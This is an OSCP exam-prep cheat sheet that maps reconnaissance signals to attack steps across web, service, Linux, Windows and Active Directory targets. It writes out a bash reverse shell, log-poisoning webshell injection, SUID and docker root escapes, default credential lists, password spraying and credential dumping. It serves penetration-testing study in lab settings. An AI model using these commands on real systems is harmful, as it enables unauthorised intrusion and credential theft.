# OSCP RED FLAGS — "You're On The Right Path" Signals

```
When you see one of these, STOP enumerating and START exploiting.
The exam is testing whether you recognize the signal and act on it.
Every flag below has appeared on real OSCP machines or your exam.
```

---

## WEB APPLICATION SIGNALS

### SQL Injection Confirmed
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Single quote ' causes 500 error or SQL error    → SQLMap or manual UNION
"You have an error in your SQL syntax"          → MySQL — try UNION SELECT
"Unclosed quotation mark"                       → MSSQL — try xp_cmdshell
"unterminated string literal"                   → PostgreSQL — try stacked queries
Page behaves differently with ' AND 1=1 vs 1=2 → Blind SQLi — use SQLMap
Login bypassed with admin'-- -                  → Auth bypass — you're in, explore admin panel
Time delay works with ' AND SLEEP(5)-- -        → Time-based blind — extract data or use SQLMap
```
**Practice scenario:** a practice run had WBCE CMS SQLi on the Windows standalone. SQLi → creds → spray.

### File Upload Possible
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Any CMS with file/image upload functionality    → Upload PHP shell with bypass:
                                                   GIF89a; prefix, .php.jpg, .pHp, .phar
Web app returns "File uploaded successfully"    → Find upload path (gobuster, source code)
IIS server with upload capability               → Upload web.config with ASP code
File type restriction error                     → Try magic bytes, double ext, null byte
WordPress with plugin/theme editor              → Edit PHP file directly → webshell
```
**Machines hit rate:** 8 out of 109 machines (7%). If upload exists, it's almost certainly the path.

### LFI / Directory Traversal Confirmed
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
../../../etc/passwd returns users                → Read config files:
                                                   /var/www/html/config.php
                                                   /var/www/html/wp-config.php
                                                   /etc/shadow (if readable = instant win)
                                                   /home/*/.ssh/id_rsa
php://filter/convert.base64-encode works        → Read source code of every PHP file
Windows traversal shows files                   → Read:
                                                   C:\Windows\Panther\Unattend.xml
                                                   C:\inetpub\wwwroot\web.config
                                                   C:\Users\*\Desktop\*.txt
Log file readable (/var/log/apache2/access.log) → Log poisoning: inject PHP in User-Agent
                                                   curl -A '<?php system($_GET["cmd"]); ?>' http://$IP
                                                   Then: ?file=/var/log/apache2/access.log&cmd=id
```

### Command Injection Confirmed
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
; id  or | id  returns uid output               → Replace with reverse shell payload
ping response after injecting ; ping $KALI      → Blind injection — use curl/wget callback
Application runs system commands (ping, nslookup → Test every parameter with ; | $() ``
  traceroute, DNS lookup, log viewer, PDF gen)
"pdfkit", "wkhtmltopdf" in headers/source       → URL-based command injection in PDF generator
Application takes hostname/IP as input           → ; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

### SSRF Possible
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
App fetches URLs (image loader, URL checker,    → Point to 127.0.0.1:PORT to scan internal
  proxy, webhook, PDF from URL)                    services. Fuzz ports 1-10000.
Internal service found on localhost              → Access admin panels hidden behind firewall
                                                   (Jenkins, Tomcat manager, admin dashboards)
```

### Default / Weak Credentials
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Tomcat manager page (/manager/html)             → tomcat:s3cret, tomcat:tomcat, admin:admin
                                                   → WAR deploy reverse shell
Jenkins dashboard (/script or /manage)          → admin:admin, admin:jenkins, no password
                                                   → Groovy console → reverse shell
Any CMS login page                              → admin:admin, admin:password, admin:Password1
                                                   → Check CMS-specific defaults
phpMyAdmin / Adminer                            → root:(blank), root:root, root:password
WordPress /wp-login.php                         → admin:admin, then wpscan for users + brute
Dolibarr / boardlight-style CMS                 → admin:admin (this was on a real HTB machine)
Database port open (3306/5432)                  → root:(blank), postgres:postgres
```
**Practice scenario:** a practice run AD was literally `user:user` (user=password). ALWAYS try user=password.

---

## NMAP / SERVICE SIGNALS

### FTP (Port 21)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
"Anonymous FTP login allowed"                   → Login immediately. Download everything.
                                                   Look for home dirs, config files, .mozilla
                                                   profiles, backup files, credentials.
FTP with home directories visible               → Firefox profiles → firefox_decrypt → creds
"Microsoft ftpd" + timeout on dir listing       → Passive mode issue: ftp> passive off
                                                   or use lftp/curl with active mode
FTP writable + web server on same box           → Upload webshell to web root via FTP
vsftpd 2.3.4                                   → Backdoor exploit (rare but check)
```
**Practice scenario:** .110 Linux was FTP anon → Firefox profiles → SSH creds in multiple practice runs, and #4.

### SMB (Port 445)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Null session allowed (smbclient -N works)       → Enumerate shares, download everything
Guest access to shares                          → Download all files. Grep for passwords.
"READ" access on non-default shares             → Look in: scripts, configs, docs, spreadsheets
                                                   HR shares often have passwords
SYSVOL/NETLOGON readable                        → GPP cpassword: find Groups.xml → gpp-decrypt
.mdb / .accdb / .xlsx / .docx in shares         → Download, open, extract credentials
Share with user home directories                → SSH keys, config files, browser profiles
```

### SNMP (UDP 161)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
SNMP port 161 open                              → snmpwalk -v2c -c public $IP
                                                   Strings contain: usernames, passwords,
                                                   running processes, installed software
"community string: public" in nmap              → Full SNMP walk — look for cleartext creds
                                                   in process command lines and descriptions
```
**Machines:** Pandora (SNMP → creds → SSH), Monitored (SNMP → API key)

### NFS (Port 2049)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
NFS port open                                   → showmount -e $IP
NFS exports visible                             → mount -t nfs $IP:/share /tmp/mount
                                                   Look for config files, SSH keys, DB files
```

### Redis (Port 6379)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Redis with no authentication                    → redis-rogue-server → RCE
                                                   or write webshell to web root
                                                   or write SSH key to /root/.ssh/
```
**Practice scenario:** a practice run .110 Linux was Redis unauthenticated → RCE.

### MSSQL (Port 1433)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
MSSQL with credentials                          → Enable xp_cmdshell → RCE
                                                → xp_dirtree to steal NTLM hash
                                                → Enumerate linked servers
"sa" account accessible                         → Full sysadmin — xp_cmdshell immediately
```

### RDP (Port 3389)
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED           → PASSWORD IS VALID. NOT wrong.
                                                   Try: evil-winrm, smbexec, wmiexec, psexec
                                                   Or: smbpasswd -r $IP -U 'user' to change it
NLA disabled                                    → Can see login screen without creds — try
                                                   found creds here
SSL cert CN = "PowerShellWebAccessTestWebSite"  → PSWA installed! Browse https://$IP/pswa
```
**Practice scenario:** a practice run had expired RDP password. You abandoned the machine. Those creds likely worked on WinRM.

---

## POST-FOOTHOLD SIGNALS — LINUX

### Instant Privilege Escalation
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
sudo -l returns ANY binary                      → GTFOBins.github.io immediately
                                                   Even obscure binaries — check the site
sudo -l returns (ALL) NOPASSWD                  → You're basically root. sudo /bin/bash
sudo -l shows env_keep+=LD_PRELOAD              → Compile evil .so → sudo LD_PRELOAD= → root
SUID on /usr/bin/find                           → find . -exec /bin/sh -p \; -quit
SUID on /usr/bin/python3                        → python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
SUID on unknown/custom binary                   → strings it. Does it call another binary
                                                   without full path? → PATH hijack
id shows "docker" group                         → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id shows "lxd" or "lxc" group                   → Import alpine image → mount host → root
```
**Frequency:** sudo + SUID = 36% of all Linux privesc in the dataset. Check in first 30 seconds.

### Credential Goldmines
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
.git directory anywhere                         → git log → git show <commit> — look for
                                                   passwords in diffs and config files
wp-config.php or similar DB config              → Extract DB creds → connect → dump users
                                                   → crack hashes → try passwords on SSH
.mozilla/firefox directory in home folder       → firefox_decrypt.py → cleartext passwords
                                                   → try every password on every service
KeePass .kdbx file found                        → keepass2john → john → master password
                                                   → open DB → extract all stored creds
Internal service on 127.0.0.1 (ss -tlnp)       → Port forward it. Could be admin panel,
                                                   database, or second web app with creds
/etc/shadow readable                            → Copy to Kali → john/hashcat → root password
Python/bash script with hardcoded credentials   → Try those creds everywhere
.env file or config.yml with secrets            → API keys, DB passwords, admin tokens
```

### Cron / Scheduled Task Signals
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Script in /etc/crontab owned by root            → Is the script writable by you? → inject shell
Script calls tar/rsync/7z with * wildcard       → Wildcard injection (checkpoint for tar)
pspy shows root running a script periodically   → Check if script or its imports are writable
Python script in cron imports a library         → Find writable path: find /usr/lib/python* -writable
                                                   → Hijack the imported module with reverse shell
chkrootkit installed (version 0.49)             → Write /tmp/update with reverse shell → root runs it
Script runs from writable directory             → Replace the entire script
```
**Practice scenario:** a practice run used Python library hijacking via cron for root on .110.

---

## POST-FOOTHOLD SIGNALS — WINDOWS

### Instant SYSTEM
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
whoami /priv → SeImpersonatePrivilege           → GodPotato-NET4.exe → SYSTEM. DONE.
                                                   This is 28% of all Windows privesc.
whoami /priv → SeBackupPrivilege                → reg save HKLM\SAM + SYSTEM → secretsdump
whoami /priv → SeRestorePrivilege               → Replace service binary → restart → SYSTEM
whoami /priv → SeManageVolumePrivilege          → Read any file on disk (including SAM)
whoami /priv → SeTakeOwnershipPrivilege         → Take ownership of any object
whoami /groups → Administrators                 → You're admin. If UAC blocking, bypass it.
whoami /groups → Backup Operators               → Can backup SAM/SYSTEM → extract hashes
whoami /groups → Server Operators               → Can modify service binaries → SYSTEM
whoami /groups → DnsAdmins                      → DLL injection into DNS service → SYSTEM
cmdkey /list → shows stored credentials         → runas /savecred /user:admin cmd.exe → admin shell
AlwaysInstallElevated → both keys = 0x1         → msfvenom MSI → msiexec → SYSTEM
```
**Practice scenario:** a practice run AD was SeImpersonate → GodPotato. a practice run AD was writable scheduled task.

### Credential Hiding Spots
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
C:\Windows\Panther\Unattend.xml exists          → READ IT. Decode base64 <Value> tags.
                                                   Contains AutoLogon passwords.
                                                   YOU MISSED THIS IN ATTEMPT #3.
PowerShell history file exists                  → READ IT. Commands with -p, -password,
                                                   Invoke-Command with creds, net use with pass
C:\output.txt or C:\Transcripts\ exists         → PowerShell transcript — full command history
AutoLogon registry values set                   → DefaultPassword is in cleartext
ConsoleHost_history.txt has content             → Grep for password, credential, net use, runas
web.config in IIS directory                     → Connection strings with DB passwords
C:\Tasks, C:\Scripts, C:\Automation exists      → Check for scripts with hardcoded creds.
                                                   Check if writable → scheduled task abuse
.kdbx file found anywhere                       → KeePass DB → keepass2john → crack → loot
TeamViewer installed                            → Extract saved credentials from registry
FileZilla installed                             → Check sitemanager.xml — base64 passwords
```
**Practice scenario:** a practice run had Unattend.xml + PS transcript + UAC disabled. 0 points because you didn't read them.

### Service Abuse Signals
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Unquoted service path with spaces               → Place payload at first space in path
  "C:\Program Files\My App\service.exe"            → drop "C:\Program Files\My.exe"
Service binary in writable directory            → Replace binary → restart service → SYSTEM
Scheduled task runs script you can write to     → Modify script → wait for execution
  icacls shows (F) or (M) for your user
Service running as LocalSystem + you can        → sc config <svc> binpath= "C:\rev.exe"
  modify config (SERVICE_CHANGE_CONFIG)              → sc stop <svc> && sc start <svc>
DLL not found in Process Monitor                → Place malicious DLL in writable search path
IIS running + writable web directory            → Drop ASPX webshell
```
**Frequency:** Service/DLL abuse = 31% of all Windows privesc. This plus Potato covers 59%.

---

## ACTIVE DIRECTORY SIGNALS

### You've Found the Path Forward
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
BloodHound shows path to DA                     → Follow the path. Trust BloodHound.
User description contains a password            → Spray it everywhere immediately
AS-REP hash cracked                             → Spray that password on all users/services
Kerberoast TGS hash cracked                     → That's a service account — check its perms
Password in SYSVOL/GPP                          → gpp-decrypt → spray everywhere
GenericAll/GenericWrite on user/computer         → Targeted Kerberoast, RBCD, or password reset
WriteDACL on domain object                      → Grant yourself DCSync rights → secretsdump
ForceChangePassword on another user             → Reset their password via rpcclient
User in "LAPS Readers" or similar group         → nxc ldap --module laps → local admin pass
Certificate Services (ADCS) found               → certipy find -vulnerable → ESC1/ESC4/ESC9
MSSQL accessible with domain creds              → xp_dirtree for NTLM theft → crack → pivot
                                                   Or: silver ticket if you have service hash
Cleartext password in LSA secrets               → This is gold — spray it domain-wide
SAM dump reveals local admin hash               → Pass-the-hash to other machines
```

### AD Pivoting Signals
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Local admin on MS01 but not MS02                → Dump LSASS — cached domain creds are there
New domain user in LSASS dump                   → Spray new creds against MS02 and DC
Service account hash cracked                    → Check BloodHound — what can this account do?
Internal subnet discovered (172.16.x.x)         → Ligolo tunnel → nmap the subnet → find DC/MS02
"Pwn3d!" in nxc output                          → You have admin on that box. Dump everything.
```

---

## UNIVERSAL SIGNALS — ALWAYS ACT ON THESE

### Credential Found ANYWHERE
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
ANY username:password combination               → Add to master_creds.txt
                                                → Spray ALL 6 exam machines within 60 seconds
                                                → Try: SMB, WinRM, RDP, SSH, MSSQL, FTP
                                                → Try the password with ALL known usernames
                                                → Try variations: Password1, password, Password!

ANY NTLM hash                                   → Add to master_hashes.txt
                                                → crackmapexec with -H against all machines
                                                → evil-winrm -H against all machines
                                                → hashcat -m 1000 with rockyou

ANY password-like string in any file            → It's probably a real password. Spray it.
```
**This is the #1 thing that separates passers from failers based on your 4 attempts.**

### Version Numbers Visible
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Exact software version anywhere                 → searchsploit <software> <version>
                                                → Google: "<software> <version> exploit"
                                                → Google: "<software> <version> RCE CVE"
                                                → 33% of all machines fall to a known CVE.
Apache/Nginx version in headers                 → Note it but focus on the web app, not httpd
PHP version in headers                          → Check for specific PHP version vulns
                                                   PHP 8.1.0-dev = backdoor in User-Agentt header
CMS with version number (footer, /readme, etc.) → CMS-specific scanner + searchsploit
```

### Error Messages / Information Disclosure
```
YOU SEE                                         → YOU DO
─────────────────────────────────────────────────────────────────
Stack trace with file paths                     → Now you know the web root, language, framework
"Debug mode" or verbose errors                  → Look for: DB creds, API keys, internal paths
.git/ accessible on web server                  → git-dumper → git log → git show → find creds
/server-status or /server-info accessible       → Apache status page — reveals internal URLs
robots.txt with hidden paths                    → Visit every disallowed path
/api-docs, /swagger.json, /openapi.json         → Full API documentation — test every endpoint
Spring Boot /actuator endpoints                 → /actuator/env for secrets, /actuator/heapdump
                                                   for memory dump, session tokens
.env file accessible                            → Database passwords, API keys, secrets
backup.zip, backup.tar.gz, db.sql accessible    → Download immediately — contains everything
```

---

## THE ANTI-RABBIT-HOLE CHECKLIST

### Signs You're In a Rabbit Hole
```
⚠️ You've been on the same attack vector for 60+ minutes with no progress
⚠️ You're crafting increasingly complex payloads for something "almost working"
⚠️ You're fuzzing 20 header combinations on an API (a previous practice session)
⚠️ You're running your 4th wordlist on the same gobuster scan
⚠️ You're trying to compile a kernel exploit from source
⚠️ You haven't tried the credentials you found on other services
⚠️ You're ignoring a simpler-looking machine to "finish" this one
```

### Signs You're On the Right Track
```
✅ You found credentials or a hash (even if you haven't used them yet)
✅ You got an error message that reveals internal information
✅ searchsploit returned results for the exact version you found
✅ Anonymous/null access gave you files to examine
✅ A web parameter responded differently to injection attempts
✅ whoami /priv or sudo -l returned something exploitable
✅ BloodHound shows a clear path from your user to DA
✅ Internal service discovered on localhost that wasn't visible from outside
✅ You found a writable file/directory that root/SYSTEM interacts with
```
